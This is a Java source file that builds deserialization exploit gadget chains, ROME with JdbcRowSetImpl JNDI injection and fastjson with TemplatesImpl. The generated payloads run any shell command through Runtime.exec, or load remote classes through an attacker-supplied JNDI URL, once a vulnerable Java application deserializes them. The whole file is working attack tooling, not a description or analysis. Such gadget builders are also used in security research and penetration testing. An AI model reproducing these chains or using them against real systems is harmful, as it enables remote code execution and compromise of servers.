package org.example;

import com.alibaba.fastjson.JSONArray;
//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;
import org.example.utils.ClassFiles;
import org.example.utils.Reflections;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
public class GadgetBuilder {
    /**
     * ROME
     *
     * @param jndiUrl
     * @return
     * @throws Exception
     */
    public static Object romePayload(String jndiUrl) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Field listeners = javax.sql.rowset.BaseRowSet.class.getDeclaredField("listeners");
        listeners.setAccessible(true);
        listeners.set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,
                rs);
        EqualsBean root = new EqualsBean(ToStringBean.class,item);

        return makeMap(root, root);

    }


    /**
     * fastjson
     * @param command
     * @return
     * @throws Exception
     */
    public static Object fastjson(String command) throws Exception {
        Object templates = createTemplatesImpl(command);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(bd, "val", jsonArray);
        HashMap hashMap = new HashMap();
        hashMap.put(new HotSwappableTargetSource(templates), new HotSwappableTargetSource(bd));
//        hashMap.put(templates, bd);
        return hashMap;

//        XString x = new XString("HEYO");
//        return makeMap(new HotSwappableTargetSource(jsonArray), new HotSwappableTargetSource(x));
    }


    public static Object createTemplatesImpl(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();

        CtClass ctClass = pool.makeClass("RuntimeD");
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
        ctClass.addConstructor(ctConstructor);

        // 设置 serialVersionUID
        ctClass.defrost();
        try {
            CtField ctField = ctClass.getDeclaredField("serialVersionUID");
            ctClass.removeField(ctField);
        } catch (Exception e) {

        }
        ctClass.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", ctClass));

        ctClass.defrost();
        ctClass.addField(CtField.make("private static final long SerialVersionUIDDemo = 8207363842866235160L;", ctClass));


        Object templates = createTemplatesImpl(ctClass.toBytecode());
        return templates;
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    classBytes,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static class PPP implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <T> T createTemplatesImpl(byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
            throws Exception {
        final T templates = tplClass.newInstance();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(PPP.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        // 满足条件 1. classCount也就是_bytecodes的数量大于1   2. _transletIndex >= 0  可去掉 AbstractTranslet
        Reflections.setFieldValue(templates, "_transletIndex", 0);
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
}
